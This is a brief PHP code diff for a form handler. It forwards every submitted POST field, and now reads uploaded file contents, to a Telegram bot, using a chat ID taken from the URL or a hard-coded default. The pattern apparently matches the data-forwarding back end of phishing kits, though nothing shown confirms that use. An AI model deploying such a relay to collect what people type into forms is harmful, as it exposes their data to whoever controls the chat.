@@ -2,11 +2,12 @@
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
     // Process the form data
     $formData = $_POST;
-    if(isset($_GET['id'])){
-          $userid = $_GET['id'];
+    if (isset($_GET['id'])) {
+        $userid = $_GET['id'];
     } else {
         $userid = '1479193538';
     }
+
     // Save the form submission to a file or database if needed
 
     // Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
@@ -19,6 +20,14 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     // Loop through the form data and create the key-value pairs in the message
     foreach ($formData as $key => $value) {
         $telegramMessage .= "$key: $value\n";
+    }
+
+    // Handle file uploads (if any)
+    if (isset($_FILES['file'])) {
+        $file = $_FILES['file'];
+        $fileContent = file_get_contents($file['tmp_name']);
+        // You can handle the file content or attach it to the Telegram message as needed.
+        // Example: $telegramMessage .= "Attachment: " . $file['name'] . "\n";
     }
 
     // Send the message to Telegram using the bot API
